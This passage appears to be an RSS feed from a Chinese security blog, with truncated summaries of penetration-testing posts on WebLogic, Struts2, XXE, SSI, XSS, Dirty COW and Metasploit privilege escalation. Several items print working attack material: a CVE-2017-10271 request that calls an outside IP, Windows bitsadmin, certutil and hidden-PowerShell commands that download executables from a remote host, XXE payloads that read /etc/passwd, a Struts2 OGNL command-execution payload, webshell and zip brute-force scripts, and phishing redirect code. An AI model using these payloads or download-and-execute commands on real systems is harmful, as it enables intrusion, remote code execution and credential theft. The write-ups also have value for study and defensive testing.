      <pubDate>Mon, 16 Apr 2018 19:16:14 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/thinkphp5-where-function/</guid>
      <description>0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。
0x01 示例代码 tp5/application/home/controller/Index.php
&amp;lt;?php namespace app\home\controller; use think\Db; class Index { //http://127.0.0.1/Source/tp5/home/index/testdb/id/1 public function testDb() { // 调用 tp5/thinkphp/library/think/Db.php 的 connect() 函数 初始化数据库，并取得数据库类实例 $msg = db(&#39;msg&#39;); $id = input(&#39;param.id&#39;,1); //不存在id的话默认为1 //在Db.php中use think\db\Query; $msg-&amp;gt;where()则调用了Query.php中的where函数进入查询流程 $result = $msg-&amp;gt;where(&amp;quot;id=&amp;quot;.$id)-&amp;gt;select(); // $result = $msg-&amp;gt;where([&#39;id&#39;=&amp;gt;$id])-&amp;gt;select(); echo &#39;&amp;lt;br/&amp;gt;&amp;lt;hr/&amp;gt;执行的sql语句：&#39;; echo $msg-&amp;gt;getLastSql(); echo &#39;&amp;lt;br/&amp;gt;最终得到的结果：&#39;; echo var_dump($result); } }  where函数接收字符串和数组时，访问http://127.0.0.1/Source/tp5/home/index/testdb/id/1执行的SQL语句分别如下：
SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存在注入，当payload为: ) and 1=1 and (1)=(1时判断返回如下： 主要调用文件及函数顺序如下：</description>
    </item>
    
    <item>
      <title>WebLogic 反序列化漏洞(CVE-2017-10271)</title>
      <link>https://wyb0.com/posts/2018/cve-2017-10271/</link>
      <pubDate>Fri, 09 Mar 2018 09:20:03 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/cve-2017-10271/</guid>
      <description>0x00 WebLogic WLS组件反序列化漏洞 这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时存在漏洞可远程代码执行，凡是版本号 &amp;lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下
漏洞环境：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
0x01 访问远程文件 POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 127.0.0.1:7001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: JSESSIONID=DJbghZRGlJf0PyyLc52n4GdvrbDkrxKWGDpwnncFpHnqsDjMT68F!-298356074 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 688 Content-Type: text/xml &amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt; &amp;lt;soapenv:Header&amp;gt; &amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt; &amp;lt;java version=&amp;quot;1.8&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt; &amp;lt;object id=&amp;quot;url&amp;quot; class=&amp;quot;java.net.URL&amp;quot;&amp;gt; &amp;lt;string&amp;gt;http://114.115.123.123:80/aaaaaaa&amp;lt;/string&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;object idref=&amp;quot;url&amp;quot;&amp;gt; &amp;lt;void id=&amp;quot;stream&amp;quot; method = &amp;quot;openStream&amp;quot; /&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;/java&amp;gt; &amp;lt;/work:WorkContext&amp;gt; &amp;lt;/soapenv:Header&amp;gt; &amp;lt;soapenv:Body/&amp;gt; &amp;lt;/soapenv:Envelope&amp;gt;  0x02 写入文件 POST /wls-wsat/CoordinatorPortType HTTP/1.</description>
    </item>
    
    <item>
      <title>Metasploit简单提权</title>
      <link>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</link>
      <pubDate>Mon, 26 Feb 2018 13:43:20 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</guid>
      <description>0x00 前提 虚拟机有一个shell：http://10.11.11.20/a.php，物理机IP是211.222.222.72
外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195
0x01 查看主机基本信息 菜刀连接shell，终端执行systeminfo
C:\Apps\phpStudy\WWW\&amp;gt; systeminfo 主机名: REBER-WIN7 OS 名称: Microsoft Windows 7 专业版 OS 版本: 6.1.7600 ��ȱ Build 7600 OS 制造商: Microsoft Corporation OS 配置: 独立服务器 OS 构件类型: Multiprocessor Free 注册的所有人: reber 注册的组织: 产品 ID: 00371-868-0000007-85272 初始安装日期: 2017/12/26, 7:23:00 系统启动时间: 2018/2/26, 9:52:14 系统制造商: Parallels Software International Inc. 系统型号: Parallels Virtual Platform 系统类型: x64-based PC 处理器: 安装了 1 个处理器。 [01]: Intel64 Family 6 Model 70 Stepping 1 GenuineIntel ~2495 Mhz BIOS 版本: Parallels Software International Inc.</description>
    </item>
    
    <item>
      <title>Windows终端下载文件和执行远程文件</title>
      <link>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</link>
      <pubDate>Tue, 06 Feb 2018 15:12:32 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</guid>
      <description>环境：Windows Server 2008 R2 Enterprise
0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe  0x01 certutil下载文件 保存在当前目录
certutil -urlcache -split -f http://114.115.123.123/a.exe a.exe  有时会下载二进制文件的base64编码后的字符串，然后再解码
本地：certutil -encode cc.exe base64.txt 目标：certutil -urlcache -split -f http://114.115.123.123/base64.txt 目标：certutil -decode base64.txt cc.exe  文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
certutil -urlcache -f http://114.115.123.123/a.exe  0x02 powershell下载文件 有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。
C:&amp;gt;powershell set-executionpolicy unrestricted
powershell (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.115.123.123/a.exe&amp;quot;,&amp;quot;C:\Windows\Temp\a.exe&amp;quot;) #-w hidden 下载后终端自动退出 powershell -w hidden -c (new-object System.</description>
    </item>
    
    <item>
      <title>XXE漏洞</title>
      <link>https://wyb0.com/posts/2017/xxe/</link>
      <pubDate>Sat, 09 Dec 2017 23:02:22 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2017/xxe/</guid>
      <description>0x00 XXE XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛
外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法
0x01 示例代码 实验环境：https://github.com/vulhub/vulhub/tree/master/php/php_xxe
simplexml_load_string.php
&amp;lt;?php $data = file_get_contents(&#39;php://input&#39;); $xml = simplexml_load_string($data); echo $xml-&amp;gt;name;  0x02 判断是否有xxe漏洞 0x03 读取文件  外部引用读取passwd  &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE xxe [ &amp;lt;!ELEMENT name ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt; ]&amp;gt; &amp;lt;root&amp;gt; &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; &amp;lt;/root&amp;gt;  &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE xxe [ &amp;lt;!ELEMENT name ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&amp;quot;&amp;gt; ]&amp;gt; &amp;lt;root&amp;gt; &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; &amp;lt;/root&amp;gt;   外部引用dtd文件读取passwd  evil.dtd中的内容为：&amp;lt;!ENTITY b SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;</description>
    </item>
    
    <item>
      <title>DNS域传送漏洞</title>
      <link>https://wyb0.com/posts/2017/dns-zone-transfer/</link>
      <pubDate>Mon, 20 Nov 2017 13:58:33 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2017/dns-zone-transfer/</guid>
      <description> 0x00 DNS域传送 DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间则通过“DNS域传送”同步数据。
若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录，从而节省许多搜集资产的时间。
0x01 通过nslookup查看域传送漏洞 分为3步：1. 设置type为ns；2. 查询ns服务器；3. 设置ns服务器 0x02 通过dig查看域传送漏洞 0x03 通过nmap查看域传送漏洞 </description>
    </item>
    
    <item>
      <title>SSI注入</title>
      <link>https://wyb0.com/posts/2017/ssi-injection/</link>
      <pubDate>Thu, 08 Jun 2017 11:20:15 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2017/ssi-injection/</guid>
      <description> 0x00 SSI SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞
若注入点在url中则可能需要进行url编码
0x01 payload &amp;quot;--&amp;gt;&#39;--&amp;gt;`--&amp;gt;&amp;lt;!--#set var=&amp;quot;a&amp;quot; value=&amp;quot;123&amp;quot;--&amp;gt;&amp;lt;!--#set var=&amp;quot;b&amp;quot; value=&amp;quot;654&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;a&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;b&amp;quot;--&amp;gt; &amp;lt;!--#echo var=&amp;quot;DATE_LOCAL&amp;quot; --&amp;gt; &amp;lt;!--#exec cmd=&amp;quot;dir&amp;quot; --&amp;gt;  0x02 示例  Referer被输出到了页面中   url中的数据被输出到页面中(有时候url中的payload需要url编码)  </description>
    </item>
    
    <item>
      <title>Struts2-046 EXP</title>
      <link>https://wyb0.com/posts/2017/struts2-046/</link>
      <pubDate>Sun, 16 Apr 2017 17:44:01 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2017/struts2-046/</guid>
      <description>Struts2 046 前段时间写的struts2 046检测脚本，代码如下：
#!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber import sys import pycurl import StringIO def initCurl(): c = pycurl.Curl() c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源 c.setopt(pycurl.MAXREDIRS, 5) # c.setopt(pycurl.PROXY,&#39;http://127.0.0.1:1080&#39;) return c def check(curl, url): head = [ &#39;Connection: close&#39;, &#39;Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150&#39; ] data = &#39;&#39;&#39;-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=&amp;quot;foo&amp;quot;; filename=&amp;quot;%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;echo dd996b71024fa97cd015f06a7f24ed30&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b&amp;quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n&#39;&#39;&#39; buf = StringIO.StringIO() curl.setopt(pycurl.WRITEFUNCTION, buf.write) curl.setopt(pycurl.POSTFIELDS, data) curl.setopt(pycurl.URL, url) # curl.setopt(pycurl.TIMEOUT, 10) curl.setopt(pycurl.HTTPHEADER, head) curl.</description>
    </item>
    
    <item>
      <title>检测WebLogic是否存在SSRF</title>
      <link>https://wyb0.com/posts/2017/weblogic-ssrf-check/</link>
      <pubDate>Fri, 14 Apr 2017 14:43:52 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2017/weblogic-ssrf-check/</guid>
      <description>0x00 weblogic返回状态 weblogic的ssrf漏洞测试3种状态，返回如下：
 同网段不存在的主机  同网段主机存活但端口不开放  同网段主机存活且端口开放   0x01 检测脚本如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import re import sys import Queue import requests import threading from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) queue = Queue.Queue() mutex = threading.Lock() class Weblogic_SSRF_Check(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for Weblogic_SSRF_Check&amp;quot;&amp;quot;&amp;quot; def __init__(self, queue): threading.Thread.__init__(self) self.queue = queue def check(self,domain,ip): payload = &amp;quot;uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&amp;amp;rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Business+location&amp;amp;btnSubmit=Search&amp;quot;.format(ip=ip) url = domain + payload try: html = requests.get(url=url, timeout=15, verify=False).content m = re.</description>
    </item>
    
    <item>
      <title>XSS中的编码</title>
      <link>https://wyb0.com/posts/2017/xss-encode/</link>
      <pubDate>Thu, 30 Mar 2017 15:25:37 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2017/xss-encode/</guid>
      <description>0x00 浏览器解析 浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时， 会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容， 对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本， 在这之前它是HTML的一部分  0x01 一些编码  URL编码
%+字符的ASCII编码对应的两位十六进制，如&amp;quot;/&amp;quot;的url编码为&amp;quot;%2F&amp;quot;  HTML编码
 实体编码
&amp;amp;开头分号结尾，如 &amp;quot;&amp;lt;&amp;quot; 的编码是 &amp;quot;&amp;amp;lt;&amp;quot;  字符编码
样式为&amp;quot;&amp;amp;#数值;&amp;quot;，数值可为10进制、16进制ASCII编码或unicode字符编码 如&amp;quot;&amp;lt;&amp;quot;可编码为&amp;quot;&amp;amp;#060;&amp;quot;和&amp;quot;&amp;amp;#x3c;&amp;quot;，但是必须在属性值里面   JS编码
1、两个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\x3c&amp;quot; 2、三个八进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\074&amp;quot; 3、四个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\u003c&amp;quot; 4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）  CSS编码
反斜线(\)后跟1~6位的16进制数字，如&amp;quot;e&amp;quot;为&amp;quot;\65&amp;quot;或&amp;quot;65&amp;quot;或&amp;quot;00065&amp;quot;   0x02 编码与解码顺序 解码时先解码最外层，编码时先编码最内层
如&amp;lt;td onclick=&amp;quot;openUrl(add.do?userName=&#39;{$value}&#39;);&amp;quot;&amp;gt;11&amp;lt;/td&amp;gt;， 首先value出现在url中，而url在js中，而js又是html一部分，所以 解码顺序为：html解码-&amp;gt;js解码-&amp;gt;url解码 编码顺序为：url编码-&amp;gt;js编码-&amp;gt;html编码  0x03 利用  八进制
&amp;lt;p id=&amp;quot;test&amp;quot;&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; var test = &amp;quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&amp;quot;; var p = document.getElementById(&#39;test&#39;); #这里会进行js解码 p.innerHTML = test; &amp;lt;/script&amp;gt;  十进制和十六进制
&amp;lt;img src=x onerror=&amp;quot;\u0061\u006c\u0065\u0072\u0074(1)&amp;quot;&amp;gt; &amp;lt;img src=x onerror=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;quot;&amp;gt;  javascript协议</description>
    </item>
    
    <item>
      <title>利用多参数提高webshell爆破速度</title>
      <link>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</link>
      <pubDate>Fri, 17 Feb 2017 10:32:24 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</guid>
      <description>0x00 原理 之前在https://www.t00ls.net/viewthread.php?tid=36985看到这个思路的。
Apache下默认同时允许接收1000个参数；IIS下默认同时允许接收5883个参数，可以一次提交多个密码，从而快速爆破。
0x01 爆破webshell代码 #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber &amp;lt;1070018473@qq.com&amp;gt; import sys import requests proxy = {&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;} headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0&#39;, &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;, &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;, } def get_file(filename): data = [] with open(filename,&#39;r&#39;) as f: lines = f.readlines() for line in lines: data.append(line.strip()) return data def get_payloads(data): payloads = [] for x in xrange(0,10): print x*1000,(x+1)*1000 payload = [] for y in data[x*1000:(x+1)*1000]: payload.</description>
    </item>
    
    <item>
      <title>Python实现CDN的判断</title>
      <link>https://wyb0.com/posts/2016/python-cnd-check/</link>
      <pubDate>Fri, 23 Dec 2016 21:10:05 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-cnd-check/</guid>
      <description>0x00 什么是CDN CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容， 运营商会在全国各地的节点上缓存你的网站网页，通过负载均衡技术，将用户的请求定向到最合适的 缓存服务器上去获取内容，比如说你是上海用户，你访问www.aa.com就会被重定向到上海的节点， 你是北京用户，你也访问www.aa.com，但是你会被重定向到上海的节点。  0x01 判断方法  可以查询CNAME记录，每个cdn厂商都有特有的特征串 查看http返回头的头部信息  0x02 代码 首先安装dnspython这个第三方模块：pip install dnspython
#!/usr/bin/env python # -*- coding: utf-8 -*- import sys import dns.resolver import urllib2 import urlparse class CdnCheck(object): def __init__(self, url): super(CdnCheck, self).__init__() self.cdninfo() self.url = url self.cnames = [] self.headers = [] def get_cnames(self): # get all cname furl = urlparse.urlparse(self.url) url = furl.netloc # print url rsv = dns.</description>
    </item>
    
    <item>
      <title>[转]MySQL报错注入原理分析(count()、rand()、group by)</title>
      <link>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</link>
      <pubDate>Sun, 13 Nov 2016 11:59:26 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</guid>
      <description>原文链接：http://drops.wooyun.org/tips/14312
0x00 疑问 一直在用mysql数据库报错注入方法，但为何会报错？
百度谷歌知乎了一番，发现大家都是把官网的结论发一下截图，然后执行sql语句证明一下结论，但是没有人去深入研究为什么rand不能和order by一起使用，也没彻底说明三者同时使用报错的原理。
0x01 位置问题？ select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;这是网上最常见的语句,目前位置看到的网上sql注入教程,floor 都是直接放count(*)后面，为了排除干扰，我们直接对比了两个报错语句，如下图
由上面的图片，可以知道报错跟位置无关。
0x02 绝对报错还是相对报错？ 是不是报错语句有了floor(rand(0)*2)以及其他几个条件就一定报错？其实并不是如此，我们先建建个表，新增一条记录看看，如下图： 确认表中只有一条记录后，再执行报错语句看看，如下图： 多次执行均未发现报错。
然后我们新增一条记录。 然后再测试下报错语句 多次执行并没有报错
OK 那我们再增加一条 执行报错语句 ok 成功报错
由此可证明floor(rand(0)*2)报错是有条件的，记录必须3条以上，而且在3条以上必定报错，到底为何？请继续往下看。
0x03 随机因子具有决定权么(rand()和rand(0)) 为了更彻底的说明报错原因，直接把随机因子去掉，再来一遍看看，先看一条记录的时候，如下图: 一条记录的话 无论执行多少次也不报错
然后增加一条记录。
两条记录的话 结果就变成不确定性了 随机出现报错。
然后再插入一条
三条记录之后，也和2条记录一样进行随机报错。
由此可见报错和随机因子是有关联的，但有什么关联呢，为什么直接使用rand()，有两条记录的情况下就会报错，而且是有时候报错，有时候不报错，而rand(0)的时候在两条的时候不报错，在三条以上就绝对报错？我们继续往下看。
0x04 不确定性与确定性 前面说过，floor(rand(0)*2)报错的原理是恰恰是由于它的确定性，这到底是为什么呢？从0x03我们大致可以猜想到，因为floor(rand()*2)不加随机因子的时候是随机出错的，而在3条记录以上用floor(rand(0)*2)就一定报错，由此可猜想floor(rand()*2)是比较随机的，不具备确定性因素，而floor(rand(0)*2)具备某方面的确定性。
为了证明我们猜想，分别对floor(rand()*2)和floor(rand(0)*2)在多记录表中执行多次(记录选择10条以上)，在有12条记录表中执行结果如下图：
mysql&amp;gt; select floor(rand()*2) from `T-Safe`; +-----------------+ | floor(rand()*2) | +-----------------+ | 0 | | 0 | | 0 | | 0 | | 0 | | 0 | | 1 | | 0 | | 0 | | 0 | | 0 | | 0 | +-----------------+ 12 rows in set (0.</description>
    </item>
    
    <item>
      <title>脏牛漏洞</title>
      <link>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</link>
      <pubDate>Sat, 22 Oct 2016 00:10:46 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</guid>
      <description>0x00 测试环境 我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见
CentOS release 6.5 [reber123@WYB ~]$ uname -a Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux [reber123@WYB ~]$ id uid=502(reber123) gid=502(reber123) groups=502(reber123)  0x01 创建文件 查看文件权限信息，可以看到属主为root，且只读，权限为0404
[reber123@WYB ~]$ ls -al test -r-----r-- 1 root root 19 Oct 21 00:02 test [reber123@WYB ~]$ cat test this is not a test [reber123@WYB ~]$  0x02 编译、执行poc POC保存为a.c，编译为aaa
[reber123@WYB ~]$ gcc -lpthread a.c -o aaa [reber123@WYB ~]$ ls aaa a.</description>
    </item>
    
    <item>
      <title>代码执行漏洞(二)</title>
      <link>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</link>
      <pubDate>Fri, 14 Oct 2016 13:16:32 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</guid>
      <description> 接着上一篇：代码执行漏洞(一) 0x00 函数create_function() php中的函数create_function()可以创建一个匿名函数，其函数原型如下：
string create_function ( string $args , string $code ) 其中$args是函数的参数，$code是函数的内容  若对提交的code未过滤或过滤不当则可能会导致代码执行漏洞
0x01 示例 示例a.php代码如下：
&amp;lt;?php $test = @$_GET[&#39;test&#39;]; $newfun = create_function(&#39;$a,$b&#39;, $test); $newfun(&#39;1111&#39;,&#39;2222&#39;); ?&amp;gt; 上述代码中$nuwfun(&#39;1111&#39;,&#39;2222&#39;)代表此时$a=&#39;1111&#39;,$b=&#39;2222&#39;,然后将其传给$test  0x02 函数assert() 这个函数和eval()的作用差不多
&amp;lt;?php @assert($_GET[&#39;str&#39;]); ?&amp;gt;  </description>
    </item>
    
    <item>
      <title>利用_blank属性钓鱼</title>
      <link>https://wyb0.com/posts/2016/use-blank-attribute-to-fish/</link>
      <pubDate>Wed, 12 Oct 2016 10:24:38 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/use-blank-attribute-to-fish/</guid>
      <description>0x00 _blank _blank是html中的标签属性，如&amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;, 但若点击HELLO打开的网页1.php中有如下代码：
&amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt;  则原网页将转跳到http://xss.reber.com/fish.html ，这就会造成钓鱼
0x01 简单模板  a.html内容如下：  &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   http://xss.reber.com/1.php中1.php内容如下：  &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;p&amp;gt;hello&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   1.php同级下有个钓鱼模板fish.html，内容如下：  &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;fish&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h2&amp;gt;This is fishing template!&amp;lt;/h2&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   点击a.</description>
    </item>
    
    <item>
      <title>SqlmapApi常用方法封装</title>
      <link>https://wyb0.com/posts/2016/package-sqlmapapi-common-function/</link>
      <pubDate>Wed, 21 Sep 2016 17:37:33 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/package-sqlmapapi-common-function/</guid>
      <description>0x00 代码如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import threading import requests import json from time import sleep class Sqli(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for AutoSqli&amp;quot;&amp;quot;&amp;quot; def __init__(self, server, target, data=&#39;&#39;, referer=&#39;&#39;, cookie=&#39;&#39;): threading.Thread.__init__(self) self.server = server[0:-1] if server[-1]==&#39;/&#39; else server self.target = target self.data = data self.referer = referer self.cookie = cookie self.taskid = &#39;&#39; self.data def new_task(self): url = &amp;quot;{}/task/new&amp;quot;.format(self.server) self.taskid = json.loads(requests.get(url).text)[&#39;taskid&#39;] if len(self.taskid)&amp;gt;0: print &amp;quot;Create new task,taskid is: %s&amp;quot; % self.</description>
    </item>
    
    <item>
      <title>Python爆破zip压缩包</title>
      <link>https://wyb0.com/posts/2016/python-blasting-zip-archive/</link>
      <pubDate>Tue, 20 Sep 2016 14:50:59 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-blasting-zip-archive/</guid>
      <description>0x00 代码 多线程爆破加密的zip压缩包
#!/usr/bin/env python # -*- coding: utf-8 -*- import sys import optparse import zipfile import threading import Queue queue = Queue.Queue() lock = threading.Lock() result = &#39;&#39; def load_pwd(filename): for line in open(filename,&#39;r&#39;): if line: queue.put(line.strip()) def bruter(zipname,queue): global result zFile = zipfile.ZipFile(zipname) while not queue.empty(): password = queue.get() try: zFile.extractall(pwd=password) # 解压 lock.acquire() print &amp;quot;[Ok] password is: %s&amp;quot; % password lock.release() result = password except: lock.acquire() print &amp;quot;[Error] password not is: %s&amp;quot; % password lock.</description>
    </item>
    
    <item>
      <title>POC框架Pocsuite</title>
      <link>https://wyb0.com/posts/2016/poc-framework-pocsuite/</link>
      <pubDate>Thu, 08 Sep 2016 20:38:45 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/poc-framework-pocsuite/</guid>
